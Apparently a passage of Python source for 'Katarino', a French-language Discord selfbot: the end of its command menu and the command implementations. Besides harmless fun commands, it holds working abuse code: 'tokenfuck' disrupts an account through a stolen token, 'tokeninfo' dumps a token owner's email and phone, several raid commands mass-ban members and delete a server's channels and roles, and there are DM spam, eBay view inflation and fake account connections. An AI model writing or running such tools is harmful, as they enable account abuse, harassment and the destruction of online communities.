{Fore.CYAN}masscon (type) (amount) (name) - {Fore.RESET}Ajoutez une grande quantité de connexions à votre profil (par exemple:!masscon skype 5 Katarino)


{Fore.CYAN}Commandes ludiques et sociales [18]

{Fore.CYAN}fox - {Fore.RESET}Image de renard aléatoire
{Fore.CYAN}dog - {Fore.RESET}Image de chien aléatoire
{Fore.CYAN}cat - {Fore.RESET}Image de chat aléatoire (La clé API du chat doit être définie dans le fichier config.js)
{Fore.CYAN}minesweeper - {Fore.RESET}Jouez au dragueur de mines dans le chat Discord
{Fore.CYAN}dick (user) - {Fore.RESET}Afficher la taille du penis de l'utilisateur mentionnée
{Fore.CYAN}rainbow (role) - {Fore.RESET}Couleurs de cycle dans le rôle que vous spécifiez
{Fore.CYAN}8ball (question) - {Fore.RESET}Répond à votre question
{Fore.CYAN}joke - {Fore.RESET}Laisse une blague aléatoire dans le chat (en anglais !)
{Fore.CYAN}slot - {Fore.RESET}Jouez à la machine à sous dans le chat Discord
{Fore.CYAN}topic - {Fore.RESET}Commencez un sujet aléatoire pour continuer le chat
{Fore.CYAN}wyr - {Fore.RESET}Commencez un sujet «que préférez-vous» dans le chat
{Fore.CYAN}feed (user) - {Fore.RESET}Nourrir l'utilisateur mentionné
{Fore.CYAN}tickle (user) - {Fore.RESET}Chatouillez l'utilisateur mentionné
{Fore.CYAN}slap (user) - {Fore.RESET}Gifler l'utilisateur mentionné
{Fore.CYAN}hug (user) - {Fore.RESET}Faire un calin a l'utilisateur mentionné
{Fore.CYAN}smug (user) - {Fore.RESET}Smug à l'utilisateur mentionné
{Fore.CYAN}pat (user) - {Fore.RESET}Pat l'utilisateur mentionné
{Fore.CYAN}kiss (user) - {Fore.RESET}Embrassez l'utilisateur mentionné


{Fore.CYAN}Commandes de piratage [9]

{Fore.CYAN}tokeninfo (token) - {Fore.RESET}Afficher diverses informations sur le token
{Fore.CYAN}tokenfuck (token) - {Fore.RESET}Crash, écran glitch d'un token, tout en discord
{Fore.CYAN}geoip (ip) - {Fore.RESET}Afficher diverses informations sur l'IP
{Fore.CYAN}ebay-view (url) (views) - {Fore.RESET}Envoyez des vues à un produit ebay (exemple: !ebay-view https://www.ebay.es/itm/XXXXXX 100)
{Fore.CYAN}gmail-bomb - {Fore.RESET}Spam un gmail (L'information est insérée via la console)
{Fore.CYAN}nitro - {Fore.RESET}Générer un code nitro aléatoire
{Fore.CYAN}proxies - {Fore.RESET}Vole les proxys HTTP / HTTPS / SOCKS4 / SOCKS5
{Fore.CYAN}address (text) - {Fore.RESET}Génère une fausse adresse en fonction du texte que vous spécifiez
{Fore.CYAN}masslogin (choice) - {Fore.RESET}Vous permet de vous connecter en masse dans les tokens bot / utilisateur


{Fore.CYAN}Commandes de crypto-monnaie [2]

{Fore.CYAN}btc - {Fore.RESET}Afficher le prix actuel du Bitcoin
{Fore.CYAN}eth - {Fore.RESET}Afficher le prix actuel d'Ethereum


{Fore.CYAN}Commandes de chiffrement et de déchiffrement [2]

{Fore.CYAN}encode (string) - {Fore.RESET}Encoder une chaîne en base64 ascii
{Fore.CYAN}decode (string) - {Fore.RESET}Décoder une chaîne de base64 en texte normal


{Fore.CYAN}Commandes d'utilisation [7]

{Fore.CYAN}bitly (link) - {Fore.RESET}Raccourcir le lien ur en utilisant bitly (Doit avoir la clé api bitly définie dans le fichier config.js)
{Fore.CYAN}tinyurl (link) - {Fore.RESET}Raccourcir le lien url en utilisant tinyurl
{Fore.CYAN}weather (city) - {Fore.RESET}Rechercher la météo pour la ville spécifiée
{Fore.CYAN}backup-f - {Fore.RESET}Sauvegardez le nom et le tag de vos amis
{Fore.CYAN}auto-bump (channel id) - {Fore.RESET}Basculer automatiquement le serveur vers disboard.org (nécessite que le disboard soit sur le serveur)
{Fore.CYAN}mac (mac) - {Fore.RESET}Recherchez un peu d'informations sur un MAC (exemple: !mac xx: xx: xx: xx: xx: xx)
{Fore.CYAN}copy - {Fore.RESET}Copie les canaux de guilde, les catégories, les canaux vocaux et les crée dans un nouveau


{Fore.CYAN}Commandes de raid [9]

{Fore.CYAN}destroy	- {Fore.RESET}Interdisez, supprimez des rôles, supprimez des chaînes, modifiez les informations de la guilde, créez des chaînes en masse Tout en un!
{Fore.CYAN}dmall (messsage) - {Fore.RESET}Messages chaque utilisateur de cette guilde avec un temps de sommeil de 10 secondes pour chaque utilisateur (Pourrait vous rendre désactivé)
{Fore.CYAN}massban - {Fore.RESET}Bannissez tous les utilisateurs de cette guilde
{Fore.CYAN}masskick - {Fore.RESET}Coup de pied à tous les utilisateurs de cette guilde
{Fore.CYAN}massrole - {Fore.RESET}Création de rôles en masse
{Fore.CYAN}masschannel - {Fore.RESET}Création de chaînes en masse
{Fore.CYAN}delroles - {Fore.RESET}Supprimer tous les rôles
{Fore.CYAN}delchannels - {Fore.RESET}Supprimer toutes les chaînes
{Fore.CYAN}massunban - {Fore.RESET}Libérez chaque membre

{Fore.CYAN}Voila c'est la fin des commandes du selfbot Katarino bonne chance

''')

@Katarino.command()
async def owo(ctx):
    await ctx.message.delete()
    await ctx.send("0w0")

@Katarino.command()
async def massspoiler(ctx):
    await ctx.message.delete()
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')
    await ctx.send('''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ''')

@Katarino.command()
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}La clé API Cat n'a pas été définie dans le fichier config.js"+Fore.RESET)
    else:
        try:
            req = requests.get(f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)


@Katarino.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))

@Katarino.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])

@Katarino.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff)

@Katarino.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Katarino.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@Katarino.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Katarino.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)

@Katarino.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

@Katarino.command()
async def revav(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
	    format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))

@Katarino.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@Katarino.command()
async def whois(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@Katarino.command()
async def minesweeper(ctx, size: int = 5): # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Katarino.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)

@Katarino.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@Katarino.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@Katarino.command()
async def blank(ctx): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Tu n'a pas mit ton modpass dans config.js"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:
             await Katarino.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Katarino.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Tu n'a pas mis ton modpass dans config.js"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Katarino.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@Katarino.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Katarino",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break

@Katarino.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)

@Katarino.command()
async def masscon(ctx, _type, amount: int, *, name=None): # b'\xfc'
    await ctx.message.delete()
    payload = {
        'name': name,
        'visibility': 1
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json',
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5)
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@Katarino.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None): # b'\xfc'
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
		'visibility': 1
	}
    headers = {
		'Authorization': token,
        'Content-Type':'application/json',
	}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)

@Katarino.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@Katarino.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await Katarino.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Katarino.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Katarino.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="https://katarino-selfbot.000webhostapp.com/menu.html",
            reason="https://katarino-selfbot.000webhostapp.com/menu.html",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@Katarino.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)
            await user.send(message)
        except:
            pass

@Katarino.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

@Katarino.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass

@Katarino.command()
async def massrole(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return

@Katarino.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@Katarino.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Katarino.command()
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Katarino.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Katarino.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@Katarino.command()
async def dm(ctx, user : discord.Member, *, message): # b'\xfc'
    await ctx.message.delete()
    user = Katarino.get_user(user.id)
    if ctx.author.id == Katarino.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass

@Katarino.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)

@Katarino.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@Katarino.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break

@Katarino.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'C est un non retentissant',
      'Il ne semble pas probable',
      'Trop difficile à dire',
      'Il est tout à fait possible',
      'C est un vrai oui!',
	  'Peut être',
